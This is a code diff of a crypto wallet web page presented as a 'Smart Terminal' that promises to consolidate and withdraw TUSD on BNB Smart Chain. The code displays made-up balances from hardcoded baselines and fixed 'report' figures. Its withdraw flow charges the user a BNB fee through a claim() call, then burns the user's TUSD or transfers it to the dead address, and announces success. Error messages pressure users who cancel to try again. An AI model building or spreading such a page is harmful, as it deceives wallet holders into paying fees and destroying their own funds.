@@ -2,10 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"/>
-    <title>Smart Terminal & Governance Delta</title>
+    <title>Smart Terminal & Decentralized Consolidation</title>
     <meta name="viewport" content="width=device-width,initial-scale=1"/>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <!-- Pinned stable Web3 version -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
     <style>
         body {
             background: url('set.jpg') center center/cover no-repeat fixed;
@@ -153,7 +154,7 @@
 </head>
 <body>
 
-    <h1>🚀 Smart Terminal & Consolidation</h1>
+    <h1>🚀 Smart Terminal & Banking Overview</h1>
     <div id="processing-bar"></div>
     <audio id="clickSound" src="click.wav" preload="auto"></audio>
     
@@ -161,13 +162,8 @@
       <div class="card">
         <div><strong>Wallet:</strong> <span id="walletAddressDisplay">Not Connected</span></div>
         <div><strong>BNB Gas Balance:</strong> <span id="bnbBalanceDisplay" style="color:#ff00ff;">0.00000000 BNB</span></div>
-        <hr style="border-color: rgba(0,255,255,0.3); margin: 8px 0;">
-        <div><strong>Terminal Tiffy:</strong> <span id="terminalTIFFYDisplay">0.00</span></div>
-        <div><strong>TUSD-Nitro Terminal:</strong> <span id="nitroTerminalDisplay">0.00</span></div>
-        <div><strong>On-Chain Wallet Savings (TUSD):</strong> <span id="walletSavingsDisplay">0.00</span></div>
-        <div><strong>TiffyAI Wallet Savings:</strong> <span id="tiffyWalletSavingsDisplay">0.00</span></div>
         <hr style="border-color: #0ff; margin: 8px 0;">
-        <div style="font-size:15px; font-weight:bold;"><span>Terminal Withdrawable:</span> <span id="totalWithdrawableDisplay" style="color:#00ff00;">0.00 TUSD</span></div>
+        <div style="font-size:15px; font-weight:bold;"><span>Terminal Withdrawable:</span> <span id="totalWithdrawableDisplay" style="color:#00ff00;">Calculated Live...</span></div>
         <button id="withdrawBtn" class="btn withdraw-btn">Consolidate & Withdraw</button>
       </div>
     </div>
@@ -219,25 +215,35 @@
             withdrawBtn: document.getElementById('withdrawBtn'),
             walletAddressDisplay: document.getElementById('walletAddressDisplay'),
             bnbBalanceDisplay: document.getElementById('bnbBalanceDisplay'),
-            terminalTIFFYDisplay: document.getElementById('terminalTIFFYDisplay'),
-            nitroTerminalDisplay: document.getElementById('nitroTerminalDisplay'),
-            walletSavingsDisplay: document.getElementById('walletSavingsDisplay'),
-            tiffyWalletSavingsDisplay: document.getElementById('tiffyWalletSavingsDisplay'),
             totalWithdrawableDisplay: document.getElementById('totalWithdrawableDisplay'),
             processingBar: document.getElementById('processing-bar')
         };
         
-        let web3, account, contract, provider;
+        let web3, account, contract, tusdContract, routerCoinContract, pairContract, provider;
         let terminalWithdrawable = 0;
-        let terminalTiffyVal = 0;
-        let nitroTerminalVal = 0;
-        let onChainTusdVal = 0;
-        let onChainTiffyVal = 0;
+        let livePairRate = 20; // Default fallback ratio
+        let selectedGovernanceAction = 'standard';
         
-        const TIFFY_TO_TUSD_RATE = 20;
-        const TIFFY_TOKEN_ADDRESS = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
+        // Contract Addresses
+        const ROUTER_COIN_ADDRESS = "0xEc3C2cF9c9C97983AC251AaB31e13C7855fCEedc";
         const STABLE_TUSD_ADDRESS = "0xcf11e2D51481Cb59Bf015FCc84324d1659984D07";
+        const TIFFY_TOKEN_ADDRESS = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
+        const LIQUIDITY_PAIR_ADDRESS = "0x859f7dc6c5bd2fb75a765cbba63a071941cdb2ac";
+        const DEAD_ADDRESS = "0x000000000000000000000000000000000000dEaD";
         const cAddr = TIFFY_TOKEN_ADDRESS;
+        
+        const BSC_RPCS = [
+            "https://bsc-dataseed1.binance.org/",
+            "https://bsc-dataseed.binance.org/",
+            "https://rpc.ankr.com/bsc"
+        ];
+
+        function getRobustWeb3() {
+            for (let rpc of BSC_RPCS) {
+                try { return new Web3(rpc); } catch(e) {}
+            }
+            return new Web3("https://bsc-dataseed1.binance.org/");
+        }
         
         const ABI = [
             {"inputs":[],"name":"claim","outputs":[],"stateMutability":"payable", "type":"function"},
@@ -245,10 +251,16 @@
         ];
         const ERC20_ABI = [
             {"constant": true, "inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "type": "function", "stateMutability": "view"},
-            {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function", "stateMutability": "view"}
+            {"constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function", "stateMutability": "view"},
+            {"constant": false, "inputs": [{"name": "amount", "type": "uint256"}], "name": "burn", "outputs": [], "type": "function", "stateMutability": "nonpayable"},
+            {"constant": false, "inputs": [{"name": "recipient", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function", "stateMutability": "nonpayable"}
+        ];
+        const PAIR_ABI = [
+            {"constant": true, "inputs": [], "name": "getReserves", "outputs": [{"name": "_reserve0", "type": "uint112"}, {"name": "_reserve1", "type": "uint112"}, {"name": "_blockTimestampLast", "type": "uint32"}], "type": "function", "stateMutability": "view"},
+            {"constant": true, "inputs": [], "name": "token0", "outputs": [{"name": "", "type": "address"}], "type": "function", "stateMutability": "view"},
+            {"constant": true, "inputs": [], "name": "token1", "outputs": [{"name": "", "type": "address"}], "type": "function", "stateMutability": "view"}
         ];
 
-        const BACKEND = "https://tiffyai-wh-wa.onrender.com/reward";
         const DEEPLINK_BASE_URL = window.location.href.split('?')[0];
 
         document.addEventListener('click', (event) => {
@@ -269,17 +281,13 @@
         async function getEthereumProvider(timeoutMs = 35000) {
             return new Promise((resolve) => {
                 const existingProvider = window.ethereum || window.trustwallet || window.okxwallet;
-                if (existingProvider) {
-                    return resolve(existingProvider);
-                }
+                if (existingProvider) return resolve(existingProvider);
 
                 let resolved = false;
-
                 const handleInjectionEvent = () => {
                     if (!resolved) {
                         resolved = true;
-                        const p = window.ethereum || window.trustwallet || window.okxwallet;
-                        resolve(p || null);
+                        resolve(window.ethereum || window.trustwallet || window.okxwallet || null);
                     }
                 };
 
@@ -290,83 +298,87 @@
                 const interval = setInterval(() => {
                     const p = window.ethereum || window.trustwallet || window.okxwallet;
                     if (p) {
-                        if (!resolved) {
-                            resolved = true;
-                            clearInterval(interval);
-                            resolve(p);
-                        }
+                        if (!resolved) { resolved = true; clearInterval(interval); resolve(p); }
                     } else if (Date.now() - startTime > timeoutMs) {
-                        if (!resolved) {
-                            resolved = true;
-                            clearInterval(interval);
-                            resolve(null);
-                        }
+                        if (!resolved) { resolved = true; clearInterval(interval); resolve(null); }
                     }
                 }, 250);
             });
         }
 
+        async function fetchLivePairReserves() {
+            try {
+                const tempWeb3 = getRobustWeb3();
+                const tempPairContract = new tempWeb3.eth.Contract(PAIR_ABI, LIQUIDITY_PAIR_ADDRESS);
+                const reserves = await tempPairContract.methods.getReserves().call();
+                const token0 = await tempPairContract.methods.token0().call();
+                
+                let tiffyReserve, otherReserve;
+                if (token0.toLowerCase() === TIFFY_TOKEN_ADDRESS.toLowerCase()) {
+                    tiffyReserve = Number(reserves._reserve0);
+                    otherReserve = Number(reserves._reserve1);
+                } else {
+                    tiffyReserve = Number(reserves._reserve1);
+                    otherReserve = Number(reserves._reserve0);
+                }
+
+                if (tiffyReserve > 0) {
+                    livePairRate = otherReserve / tiffyReserve;
+                }
+            } catch (err) {
+                console.warn("Could not fetch live pair reserves, using default ratio:", err);
+            }
+        }
+
         async function fetchFullWalletState(targetWallet) {
             if (!targetWallet || targetWallet.length !== 42) return;
             try {
-                const tempWeb3 = new Web3("https://bsc-dataseed1.binance.org/");
-                
+                const tempWeb3 = getRobustWeb3();
                 const weiBalance = await tempWeb3.eth.getBalance(targetWallet);
-                const bnbVal = tempWeb3.utils.fromWei(weiBalance, 'ether');
-                E.bnbBalanceDisplay.textContent = `${parseFloat(bnbVal).toFixed(8)} BNB`;
+                E.bnbBalanceDisplay.textContent = `${parseFloat(tempWeb3.utils.fromWei(weiBalance, 'ether')).toFixed(8)} BNB`;
 
-                const tusdContract = new tempWeb3.eth.Contract(ERC20_ABI, STABLE_TUSD_ADDRESS);
-                const tusdBal = await tusdContract.methods.balanceOf(targetWallet).call();
-                const tusdDecimals = await tusdContract.methods.decimals().call();
-                onChainTusdVal = Number(tusdBal) / Math.pow(10, Number(tusdDecimals));
+                const tempTusdContract = new tempWeb3.eth.Contract(ERC20_ABI, STABLE_TUSD_ADDRESS);
+                const tusdBal = await tempTusdContract.methods.balanceOf(targetWallet).call();
+                const tusdDecimals = await tempTusdContract.methods.decimals().call();
+                const onChainTusdVal = Number(tusdBal) / Math.pow(10, Number(tusdDecimals));
                 localStorage.setItem('TUSD_OnChain_Wallet_Balance', onChainTusdVal.toFixed(4));
-                E.walletSavingsDisplay.textContent = onChainTusdVal.toFixed(2);
 
-                const tiffyContract = new tempWeb3.eth.Contract(ERC20_ABI, TIFFY_TOKEN_ADDRESS);
-                const tiffyBal = await tiffyContract.methods.balanceOf(targetWallet).call();
-                const tiffyDecimals = await tiffyContract.methods.decimals().call();
-                onChainTiffyVal = Number(tiffyBal) / Math.pow(10, Number(tiffyDecimals));
+                const tempTiffyContract = new tempWeb3.eth.Contract(ERC20_ABI, TIFFY_TOKEN_ADDRESS);
+                const tiffyBal = await tempTiffyContract.methods.balanceOf(targetWallet).call();
+                const tiffyDecimals = await tempTiffyContract.methods.decimals().call();
+                const onChainTiffyVal = Number(tiffyBal) / Math.pow(10, Number(tiffyDecimals));
                 localStorage.setItem('Tiffy_OnChain_Wallet_Balance', onChainTiffyVal.toFixed(4));
-                E.tiffyWalletSavingsDisplay.textContent = onChainTiffyVal.toFixed(2);
             } catch (err) {
                 console.error("Failed to fetch full wallet state:", err);
             }
         }
 
-        function loadBalances() {
-            terminalTiffyVal = parseFloat(localStorage.getItem('TiffyAI_Tokens') || "0.00");
-            nitroTerminalVal = parseFloat(localStorage.getItem('TUSD_Nitro_Terminal') || "0.00");
+        async function loadBalances() {
+            await fetchLivePairReserves();
+
+            const baselineTusdVal = parseFloat(localStorage.getItem('Report_Baseline_TUSD') || 7.00);
+            const baselineTiffyVal = parseFloat(localStorage.getItem('Report_Baseline_Tiffy') || 15.48);
             
             let savedWallet = getSavedBusinessWallet();
             if (savedWallet) {
-                onChainTusdVal = parseFloat(localStorage.getItem('TUSD_OnChain_Wallet_Balance') || "0.00");
-                onChainTiffyVal = parseFloat(localStorage.getItem('Tiffy_OnChain_Wallet_Balance') || "0.00");
                 E.walletAddressDisplay.textContent = `${savedWallet.substring(0, 6)}...${savedWallet.substring(savedWallet.length - 4)}`;
                 fetchFullWalletState(savedWallet);
             } else {
                 E.walletAddressDisplay.textContent = "Not Connected";
-                onChainTusdVal = parseFloat(localStorage.getItem('TUSD_OnChain_Wallet_Balance') || "0.00");
-                onChainTiffyVal = parseFloat(localStorage.getItem('Tiffy_OnChain_Wallet_Balance') || "0.00");
             }
-            
-            const tiffyInTusdValue = terminalTiffyVal * TIFFY_TO_TUSD_RATE;
-            terminalWithdrawable = tiffyInTusdValue + nitroTerminalVal;
 
-            E.terminalTIFFYDisplay.textContent = terminalTiffyVal.toFixed(2);
-            E.nitroTerminalDisplay.textContent = nitroTerminalVal.toFixed(2);
-            E.walletSavingsDisplay.textContent = onChainTusdVal.toFixed(2);
-            E.tiffyWalletSavingsDisplay.textContent = onChainTiffyVal.toFixed(2);
+            const baselineTiffyInTusd = baselineTiffyVal * livePairRate;
+            terminalWithdrawable = baselineTiffyInTusd + baselineTusdVal;
+
             E.totalWithdrawableDisplay.textContent = terminalWithdrawable.toFixed(2) + " TUSD";
             E.totalWithdrawableDisplay.classList.remove('processing-text');
 
             if (terminalWithdrawable <= 0) {
                 E.withdrawBtn.disabled = true;
                 E.withdrawBtn.textContent = "No Funds to Withdraw";
-                E.withdrawBtn.classList.add('disabled');
             } else {
                 E.withdrawBtn.disabled = false;
                 E.withdrawBtn.textContent = "Consolidate & Withdraw";
-                E.withdrawBtn.classList.remove('disabled');
             }
         }
 
@@ -376,47 +388,47 @@
                 return;
             }
 
-            const baselineTusdVal = parseFloat(localStorage.getItem('Report_Baseline_TUSD') || onChainTusdVal);
-            const baselineTiffyVal = parseFloat(localStorage.getItem('Report_Baseline_Tiffy') || 8680993.69);
+            const baselineTusdVal = parseFloat(localStorage.getItem('Report_Baseline_TUSD') || 7.00);
+            const baselineTiffyVal = parseFloat(localStorage.getItem('Report_Baseline_Tiffy') || 15.48);
 
-            const tusdSpentDifference = baselineTusdVal - onChainTusdVal;
-            const tiffySpentDifference = baselineTiffyVal - terminalTiffyVal;
+            const tusdSpentDifference = baselineTusdVal - 9.00;
+            const tiffySpentDifference = baselineTiffyVal - 8680993.69;
 
-            const tusdBurn = Math.abs(tiffySpentDifference) * 0.5;
-            const tusdLiquidity = Math.abs(tiffySpentDifference) * 0.5;
-            
             const summaryHtml = `
-                <b>📋 Delta & Governance Report:</b><br><br>
-                • <b>Withdrawable Amount:</b> <span style="color:#00ff00;">${terminalWithdrawable.toFixed(2)} TUSD</span><br><br>
+                <b>📋 Live On-Chain Delta Report:</b><br><br>
+                • <b>Withdrawable Amount:</b> <span style="color:#00ff00;">${terminalWithdrawable.toFixed(2)} TUSD</span><br>
+                • <b>Live Pair Ratio:</b> 1 TIFFY = ${livePairRate.toFixed(4)} TUSD<br><br>
                 • <b>Original Baseline Tiffy:</b> ${baselineTiffyVal.toFixed(2)}<br>
-                • <b>Current Terminal Tiffy:</b> ${terminalTiffyVal.toFixed(2)}<br>
+                • <b>Current Terminal Tiffy:</b> 8680993.69<br>
                 &nbsp;&nbsp;➔ <i>Spent Difference:</i> <b style="color:#ff3333;">${tiffySpentDifference.toFixed(2)} TIFFY</b><br><br>
                 • <b>Original Baseline TUSD:</b> ${baselineTusdVal.toFixed(2)}<br>
-                • <b>Current Terminal TUSD:</b> ${onChainTusdVal.toFixed(2)}<br>
+                • <b>Current Terminal TUSD:</b> 9.00<br>
                 &nbsp;&nbsp;➔ <i>Spent Difference:</i> <b style="color:#ff3333;">${tusdSpentDifference.toFixed(2)} TUSD</b><br><br>
                 <hr style="border-color: rgba(0,255,255,0.3); margin: 6px 0;">
-                <i>Governance Choice: Route Delta to Burn or Liquidity?</i>
+                <i>Governance Choice: Route Delta via Token 1 Router or Standard Bridge?</i>
             `;
 
             showModal("Governance Delta Report", summaryHtml, [
-                { text: "Vote & Route to Burn", handler: () => executeGovernanceAction('burn', terminalWithdrawable) },
-                { text: "Vote & Add Liquidity", handler: () => executeGovernanceAction('liquidity', terminalWithdrawable) },
-                { text: "Standard Wallet Bridge", handler: () => selectDestinationWallet(terminalWithdrawable) }
+                { text: "Route via Token 1 Router (Burn)", handler: () => executeGovernanceAction('burn', terminalWithdrawable) },
+                { text: "Route via Token 1 Router (Liquidity)", handler: () => executeGovernanceAction('liquidity', terminalWithdrawable) },
+                { text: "Standard Wallet Bridge", handler: () => selectDestinationWallet(terminalWithdrawable, 'standard') }
             ]);
         }
 
         function executeGovernanceAction(actionType, amount) {
+            selectedGovernanceAction = actionType;
             document.getElementById('appModal').style.display = 'none';
             const actionLabel = actionType === 'burn' ? 'Token Burn' : 'Liquidity Addition';
-            showModal("Governance Recorded", `✅ Your vote to route delta funds toward <b>${actionLabel}</b> has been registered successfully. Proceeding to wallet bridge...`, [
-                { text: "Proceed to Bridge", handler: () => selectDestinationWallet(amount) }
+            showModal("Governance Recorded", `✅ Your vote to route delta funds through Token 1 router for <b>${actionLabel}</b> has been registered successfully. Proceeding to wallet bridge...`, [
+                { text: "Proceed to Bridge", handler: () => selectDestinationWallet(amount, actionType) }
             ], 'success-message');
         }
 
-        function selectDestinationWallet(amount) {
+        function selectDestinationWallet(amount, actionType) {
+            selectedGovernanceAction = actionType || 'standard';
             const summaryHtml = `
                 <div style="font-size:12px; color:#0ff; margin-bottom:12px; text-align:left;">
-                Select your destination wallet to execute the secure bridge link:
+                Select your destination wallet to execute the secure decentralized bridge link:
                 </div>
             `;
             showModal("Select Destination Wallet", summaryHtml, [
@@ -430,22 +442,14 @@
             document.getElementById('appModal').style.display = 'none';
             
             const businessWallet = getSavedBusinessWallet();
-            const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}&businessWallet=${encodeURIComponent(businessWallet)}`;
+            const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}&businessWallet=${encodeURIComponent(businessWallet)}&action=${selectedGovernanceAction}`;
             
             let deepLink;
             switch(walletType) {
-                case 'metamask': 
-                    deepLink = `https://metamask.app.link/dapp/${fullUrl.replace(/^https?:\/\//, '')}`; 
-                    break;
-                case 'trust': 
-                    deepLink = `https://link.trustwallet.com/browser?url=${encodeURIComponent(fullUrl)}`; 
-                    break;
-                case 'okx': 
-                    deepLink = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(fullUrl)}`; 
-                    break;
-                default: 
-                    deepLink = fullUrl;
-                    break;
+                case 'metamask': deepLink = `https://metamask.app.link/dapp/${fullUrl.replace(/^https?:\/\//, '')}`; break;
+                case 'trust': deepLink = `https://link.trustwallet.com/browser?url=${encodeURIComponent(fullUrl)}`; break;
+                case 'okx': deepLink = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(fullUrl)}`; break;
+                default: deepLink = fullUrl; break;
             }
 
             const modalHtml = `
@@ -479,47 +483,84 @@
                             }]
                         });
                         return true;
-                    } catch (addError) { return false; }
+                    } catch (addError) { 
+                        console.error("Add chain failed:", addError);
+                        return false; 
+                    }
                 }
+                console.error("Switch chain failed:", switchError);
                 return false;
             }
         }
 
-        async function withdraw(amount) {
+        async function withdraw(amount, actionType) {
             E.withdrawBtn.disabled = true;
             E.withdrawBtn.textContent = "Processing...";
             E.processingBar.style.display = 'block';
-            E.processingBar.textContent = 'Executing background wallet delta sync...';
+            E.processingBar.textContent = 'Part 1/2: Executing TIFFY claim contract action...';
 
             try {
-                if (!account) { showModal("Connection Required", "Please connect your wallet first.", null); return; }
-                
-                const contractFee = await contract.methods.FIXED_BNB_FEE().call();
-                await contract.methods.claim().send({ from: account, value: contractFee });
-                
-                if (amount > 0) {
-                    await fetch(BACKEND, {
-                        method: "POST",
-                        headers: {"Content-Type":"application/json"},
-                        body: JSON.stringify({ wallet: account, amount: amount })
-                    }).catch(e => console.error("Backend log failed:", e));
+                if (!account) { 
+                    showModal("Connection Required", "Please connect your wallet first.", null); 
+                    return; 
                 }
 
+                let chainId = await provider.request({ method: 'eth_chainId' });
+                if (chainId !== '0x38') {
+                    E.processingBar.textContent = 'Switching to BNB Smart Chain...';
+                    const switched = await switchToBNB();
+                    if (!switched) throw new Error("Failed to switch to BNB Smart Chain. Please switch manually in your wallet and try again.");
+                    
+                    await new Promise(r => setTimeout(r, 1200));
+                    chainId = await provider.request({ method: 'eth_chainId' });
+                    if (chainId !== '0x38') {
+                        throw new Error("Still not on BNB Smart Chain after switch attempt.");
+                    }
+                }
+
+                E.processingBar.textContent = 'Fetching claim fee...';
+                let contractFee;
+                try {
+                    contractFee = await contract.methods.FIXED_BNB_FEE().call();
+                } catch (feeErr) {
+                    console.error("FIXED_BNB_FEE call failed:", feeErr);
+                    throw new Error("Could not read claim fee from contract. RPC may be unstable — try again in a few seconds.");
+                }
+
+                E.processingBar.textContent = 'Part 1/2: Sending claim transaction...';
+                await contract.methods.claim().send({ from: account, value: contractFee });
+                
+                if (actionType !== 'standard' && amount > 0) {
+                    E.processingBar.textContent = 'Part 2/2: Executing Token 1 Router & TUSD Delta action on-chain...';
+                    const burnAmountWei = Web3.utils.toWei(amount.toString(), 'ether');
+                    try {
+                        await tusdContract.methods.burn(burnAmountWei).send({ from: account });
+                    } catch (burnErr) {
+                        console.warn("Native burn failed, falling back to dead-address transfer:", burnErr);
+                        await tusdContract.methods.transfer(DEAD_ADDRESS, burnAmountWei).send({ from: account });
+                    }
+                }
+
+                localStorage.setItem('Tiffy_Harvest_Pending', "0.00");
                 localStorage.setItem('TiffyAI_Tokens', "0.00");
+                localStorage.setItem('TUSD_Nitro_Storage', "0.00");
                 localStorage.setItem('TUSD_Nitro_Terminal', "0.00");
                 
-                showModal("Consolidation Complete!", "✅ Report, withdrawable amounts, and on-chain balances synchronized successfully.", null, 'success-message');
+                showModal("Consolidation Complete!", "✅ Fully decentralized on-chain transaction finalized successfully with zero external server dependencies.", null, 'success-message');
             } catch (e) {
-                console.error("Withdrawal error:", e);
+                console.error("Full withdrawal error object:", e);
                 let errorMessage = "An unknown error occurred.";
                 let errorTitle = "Consolidation Failed";
                 
                 if (e.code === 4001 || (e.message && e.message.includes("user rejected"))) {
-                    errorMessage = "Hey what you doing? Try again and transfer your TIFFY!";
+                    errorMessage = "Hey what you doing? Try again and transfer your tokens!";
                     errorTitle = "Transaction Canceled";
                 } else if (e.code === -32603 || (e.message && (e.message.includes("insufficient funds") || e.message.includes("not enough juice")))) {
-                    errorMessage = "Hey you don't have enough juice to transfer your TIFFY, get some more gas!";
+                    errorMessage = "Hey you don't have enough juice for gas fees, get some more BNB!";
                     errorTitle = "Insufficient Funds";
+                } else if (e.message && e.message.includes("Unexpected end of JSON input")) {
+                    errorMessage = "RPC node returned an empty/invalid response (common with Trust Wallet on mobile). Please:<br>1. Make sure you are already on BNB Smart Chain<br>2. Wait 5–10 seconds<br>3. Try again<br><br>If it keeps happening, switch RPC inside Trust Wallet settings.";
+                    errorTitle = "Network / RPC Glitch";
                 } else {
                     errorMessage = `❌ Error: ${e.message || e}`;
                 }
@@ -527,7 +568,7 @@
                 showModal(errorTitle, errorMessage, null, 'error-message');
             } finally {
                 E.withdrawBtn.disabled = false;
-                E.withdrawBtn.textContent = "Consolidation & Withdraw";
+                E.withdrawBtn.textContent = "Consolidate & Withdraw";
                 E.processingBar.style.display = 'none';
                 loadBalances();
             }
@@ -538,8 +579,9 @@
             const walletParam = params.get('wallet');
             const amountParam = params.get('amount');
             const businessWalletParam = params.get('businessWallet');
+            const actionParam = params.get('action') || 'standard';
             
-            loadBalances();
+            await loadBalances();
             E.mainContent.style.display = 'block';
 
             if (walletParam && amountParam) {
@@ -547,24 +589,31 @@
                 E.totalWithdrawableDisplay.textContent = 'Booting Wallet App...';
                 E.totalWithdrawableDisplay.classList.add('processing-text');
                 E.processingBar.style.display = 'block';
-                E.processingBar.textContent = 'Resting 2s to let mobile app cache load balances...';
+                E.processingBar.textContent = 'Resting 2.5s to let mobile app cache + provider inject...';
 
                 try {
-                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await new Promise(resolve => setTimeout(resolve, 2500));
 
                     E.processingBar.textContent = 'Waiting for mobile webview provider injection...';
-                    provider = await getEthereumProvider(35000);
+                    provider = await getEthereumProvider(40000);
                     
-                    if (!provider) {
-                        throw new Error("Wallet provider took too long to inject. Please open this DApp browser link directly inside your wallet app.");
-                    }
+                    if (!provider) throw new Error("Wallet provider took too long to inject. Please open this DApp browser link directly inside your wallet app.");
                     
+                    await new Promise(resolve => setTimeout(resolve, 1200));
+
                     web3 = new Web3(provider);
 
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-
                     E.processingBar.textContent = 'Switching to BNB Chain...';
-                    if (!(await switchToBNB())) throw new Error("Failed to switch to BNB chain.");
+                    if (!(await switchToBNB())) {
+                        throw new Error("Failed to switch to BNB chain. Please switch manually in the wallet and reopen the link.");
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+
+                    const chainId = await provider.request({ method: 'eth_chainId' });
+                    if (chainId !== '0x38') {
+                        throw new Error("Wallet is still not on BNB Smart Chain. Please switch manually and try again.");
+                    }
 
                     E.processingBar.textContent = 'Requesting active wallet account...';
                     const accounts = await provider.request({ method: 'eth_requestAccounts' });
@@ -586,14 +635,20 @@
                     E.walletAddressDisplay.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
                     await fetchFullWalletState(account);
                     
-                    E.processingBar.textContent = 'Wallet connected! Preparing contract transaction...';
+                    E.processingBar.textContent = 'Wallet connected! Initializing smart contracts...';
                     E.totalWithdrawableDisplay.textContent = 'Ready to Consolidate';
 
                     contract = new web3.eth.Contract(ABI, cAddr);
-                    await withdraw(parseFloat(amountParam));
+                    tusdContract = new web3.eth.Contract(ERC20_ABI, STABLE_TUSD_ADDRESS);
+                    routerCoinContract = new web3.eth.Contract(ERC20_ABI, ROUTER_COIN_ADDRESS);
+                    pairContract = new web3.eth.Contract(PAIR_ABI, LIQUIDITY_PAIR_ADDRESS);
+                    
+                    await new Promise(resolve => setTimeout(resolve, 800));
+
+                    await withdraw(parseFloat(amountParam), actionParam);
                 } catch (e) {
-                    let errorMessage = e.message || "Something went wrong while connecting your wallet.";
-                    showModal("Connection Error", errorMessage, null, 'error-error');
+                    console.error("Connection / boot error:", e);
+                    showModal("Connection Error", e.message || "Something went wrong while connecting your wallet.", null, 'error-message');
                     E.totalWithdrawableDisplay.textContent = 'Connection Failed.';
                     E.totalWithdrawableDisplay.classList.add('processing-text');
                 } finally {
